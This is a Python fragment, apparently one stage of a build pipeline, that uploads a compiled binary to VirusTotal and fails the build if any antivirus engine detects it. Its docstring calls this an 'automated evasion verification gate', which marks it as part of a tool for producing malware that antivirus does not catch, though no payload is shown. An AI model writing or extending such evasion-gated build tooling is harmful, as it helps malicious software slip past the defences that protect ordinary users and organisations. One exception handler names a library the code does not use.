# STAGE 6 — VirusTotal check (optional)
# ══════════════════════════════════════════════════════════════════

def virustotal_check(binary_path, api_key):
    """
    Submits the binary to VirusTotal API.
    Build FAILS if any AV engine detects it.
    This is the automated evasion verification gate.
    """
    try:
        import urllib.request
        import urllib.parse

        log("VT", "Submitting to VirusTotal API...")

        with open(binary_path, "rb") as f:
            data = f.read()

        # Upload file
        boundary = secrets.token_hex(16)
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="sample"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

        req = urllib.request.Request(
            "https://www.virustotal.com/api/v3/files",
            data=body,
            headers={
                "x-apikey": api_key,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.load(resp)

        analysis_id = result.get("data", {}).get("id", "")
        log("VT", f"Analysis ID: {analysis_id}")
        log("VT", "Waiting 30s for analysis to complete...")
        time.sleep(30)

        # Fetch result
        req2 = urllib.request.Request(
            f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
            headers={"x-apikey": api_key},
        )
        with urllib.request.urlopen(req2, timeout=30) as resp2:
            analysis = json.load(resp2)

        stats = analysis.get("data", {}).get("attributes", {}).get("stats", {})
        malicious = stats.get("malicious", 0)
        total     = sum(stats.values())

        log("VT", f"Detections: {malicious}/{total}")

        if malicious == 0:
            ok(f"VirusTotal: 0/{total} detections — CLEAN")
        else:
            fail(f"VirusTotal: {malicious}/{total} detections — BUILD BLOCKED")

    except ImportError:
        log("VT", "requests not installed — skipping VT check")
    except Exception as e:
        log("VT", f"VT check failed: {e} — continuing")


